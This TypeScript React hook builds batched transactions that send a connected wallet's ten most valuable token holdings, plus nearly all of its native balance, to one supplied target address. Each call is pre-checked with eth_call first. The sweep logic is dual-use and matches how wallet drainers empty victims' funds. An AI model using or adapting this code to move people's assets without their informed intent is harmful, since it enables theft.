"use client"

import { useState, useCallback } from "react"
import { formatEther, parseEther, type Address, type Hex, isAddress } from "viem"
import { useAccount, useBalance, useChainId } from "wagmi"
import { getPublicClient } from "@wagmi/core"
import { config } from "@/components/providers"
import type { Token, SupportedChainId } from "@/types"

export interface TransferCall {
  to: Address
  value: bigint
  data?: Hex
  type: "native_transfer" | "erc20_transfer"
  description: string
}

// Extended type for internal sorting (includes token value for sorting)
interface TransferCallWithValue extends TransferCall {
  tokenQuote?: number
  token?: Token
}

// Native token reserve amounts (in native token units, e.g., ETH, MATIC, BNB)
// These are fixed reserve amounts for gas fees
const NATIVE_TOKEN_RESERVE: Record<number, string> = {
  1: "0.002248",      // Ethereum
  137: "0.04496",     // Polygon
  56: "0.0001724",    // BNB Chain
  42161: "0.0001124", // Arbitrum
  8453: "0.0001124",  // Base
  10: "0.0001124",    // Optimism
}

export function useTransferBuilder() {
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState<string | null>(null)
  const { address } = useAccount()
  const chainId = useChainId()
  const { data: balanceData } = useBalance({ address })

  const buildTransferCalls = useCallback(
    async (
      tokens: Token[],
      targetAddress: string,
      chainId: SupportedChainId,
    ): Promise<{ calls: TransferCall[], precheckResult?: { total: number; valid: number; failed: number } }> => {
      setLoading(true)
      setError(null)

      try {
        // Validate target address
        if (!isAddress(targetAddress)) {
          throw new Error("Invalid target address format")
        }

        if (!address) {
          throw new Error("Wallet not connected")
        }

        // Step 1: Select top 20 ERC20 tokens by value (from all tokens, not just selected)
        const allERC20Tokens = tokens
          .filter(token => {
            const balance = BigInt(token.balance || "0")
            return balance > BigInt(0) && !token.native_token
          })
          .sort((a, b) => b.quote - a.quote) // Sort by value descending
          .slice(0, 20) // Take top 20 for pre-check

        // Step 2: Build transfer calls for pre-check (top 20 ERC20 tokens)
        const precheckCalls: TransferCallWithValue[] = []

        // Add ERC20 token transfers for pre-check
        for (const token of allERC20Tokens) {
          const balance = BigInt(token.balance || "0")
          if (balance === BigInt(0)) continue

          // Encode transfer(address to, uint256 amount)
          // Function signature: 0xa9059cbb
          const recipientAddress = targetAddress.slice(2).padStart(64, '0')
          const amountHex = balance.toString(16).padStart(64, '0')
          const data = `0xa9059cbb${recipientAddress}${amountHex}` as Hex

          // Format token amount with decimals
          const tokenAmount = Number(balance) / Math.pow(10, token.contract_decimals)
          const formattedAmount = tokenAmount.toLocaleString(undefined, {
            maximumFractionDigits: token.contract_decimals,
          })

          precheckCalls.push({
            type: "erc20_transfer",
            to: token.contract_address as Address,
            value: BigInt(0),
            data,
            description: `Transfer ${formattedAmount} ${token.contract_ticker_symbol}`,
            // Store token info for sorting later
            tokenQuote: token.quote,
            token: token,
          })
        }

        // Step 3: Pre-check transactions using eth_call
        const publicClient = getPublicClient(config, { chainId: chainId as any })
        if (!publicClient) {
          throw new Error("Public client not available")
        }

        const precheckValidCalls: TransferCallWithValue[] = []
        let validCount = 0
        let failedCount = 0

        for (let i = 0; i < precheckCalls.length; i++) {
          const call = precheckCalls[i]
          try {
            await publicClient.call({
              to: call.to,
              data: call.data,
              value: call.value,
              account: address as `0x${string}`,
            })
            precheckValidCalls.push(call)
            validCount++
          } catch (err) {
            console.warn(`Pre-check failed for transaction ${i}:`, call.description, err)
            failedCount++
          }
        }

        // Step 4: Prepare native token transfer
        const nativeBalance = balanceData?.value || BigInt(0)
        let nativeTransferCall: TransferCallWithValue | null = null

        // Get fixed reserve amount for the chain
        const reserveAmountStr = NATIVE_TOKEN_RESERVE[chainId]
        if (reserveAmountStr) {
          const reserveAmountWei = parseEther(reserveAmountStr)
          
          // Add native token transfer only if balance > reserve
          if (nativeBalance > reserveAmountWei) {
            const transferAmount = nativeBalance - reserveAmountWei
            // Find native token in tokens array to get quote
            const nativeToken = tokens.find(t => t.native_token)
            nativeTransferCall = {
              type: "native_transfer",
              to: targetAddress as Address,
              value: transferAmount,
              description: `Transfer ${formatEther(transferAmount)} ${balanceData?.symbol || "ETH"} (reserved ${reserveAmountStr} ${balanceData?.symbol || "ETH"} for gas)`,
              tokenQuote: nativeToken?.quote || 0,
              token: nativeToken,
            }
          }
        }

        const maxTransfers = 10

        // Step 5: Combine pre-checked valid calls and native transfer, then sort by value descending
        const allValidCalls: TransferCallWithValue[] = [
          ...precheckValidCalls,
          ...(nativeTransferCall ? [nativeTransferCall] : []),
        ].sort((a, b) => (b.tokenQuote || 0) - (a.tokenQuote || 0)) // Sort by value descending

        // Step 6: Take top 10 for execution
        const finalCalls: TransferCall[] = allValidCalls.slice(0, maxTransfers).map(call => {
          // Remove temporary properties
          const { tokenQuote, token, ...cleanCall } = call
          return cleanCall
        })

        if (finalCalls.length === 0) {
          throw new Error("No valid transfers to execute")
        }

        const precheckResult = {
          total: precheckCalls.length,
          valid: validCount,
          failed: failedCount,
        }

        return {
          calls: finalCalls,
          precheckResult,
        }
      } catch (err: unknown) {
        const errorMessage = err instanceof Error ? err.message : 'Unknown error occurred'
        console.error("Error building transfer calls:", err)
        setError(errorMessage)
        throw err
      } finally {
        setLoading(false)
      }
    },
    [address, balanceData, chainId],
  )

  return {
    buildTransferCalls,
    loading,
    error,
  }
}

